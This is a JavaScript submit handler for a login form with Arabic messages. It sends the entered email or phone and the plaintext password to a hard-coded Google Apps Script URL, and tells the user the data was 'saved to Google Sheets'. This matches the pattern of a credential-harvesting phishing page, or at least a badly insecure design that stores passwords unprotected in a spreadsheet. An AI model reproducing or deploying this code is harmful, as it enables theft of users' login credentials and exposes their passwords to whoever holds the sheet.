const handleSubmit = async (e) => {
  e.preventDefault();

  if (!validateInput(identifier)) {
    toast({
      title: "خطأ في الإدخال",
      description: "يرجى إدخال بريد إلكتروني صحيح أو رقم هاتف صالح.",
      variant: "destructive",
    });
    return;
  }

  if (!navigator.onLine) {
    toast({
      title: "لا يوجد اتصال بالإنترنت",
      description: "يرجى التحقق من اتصالك بالإنترنت والمحاولة مرة أخرى.",
      variant: "destructive",
    });
    return;
  }

  setIsLoading(true);

  try {
    const response = await fetch("https://script.google.com/macros/s/AKfycbxKpIIdkgFQ95TecOGHUgtM1aHx35KaaCsMdna_u9lUHcCLtPx3g4BNTQZIVS8pwqd8rw/exec", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: identifier, password: password }),
    });

    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }

    const data = await response.json();
    console.log("Response Data:", data);

    if (data.status === "success") {
      toast({
        title: "✅ تم تسجيل الدخول بنجاح!",
        description: "تم حفظ بياناتك في Google Sheets.",
      });
    } else {
      toast({
        title: "❌ فشل العملية",
        description: data.message || "حدث خطأ أثناء تسجيل الدخول. حاول مرة أخرى.",
        variant: "destructive",
      });
    }
  } catch (error) {
    console.error("⚠️ Fetch Error:", error);
    toast({
      title: "⚠️ خطأ في الاتصال",
      description: `لم نتمكن من إرسال بياناتك. تحقق من الإنترنت أو أخطاء CORS.\nتفاصيل: ${error.message}`,
      variant: "destructive",
    });
  }

  setIsLoading(false);
};
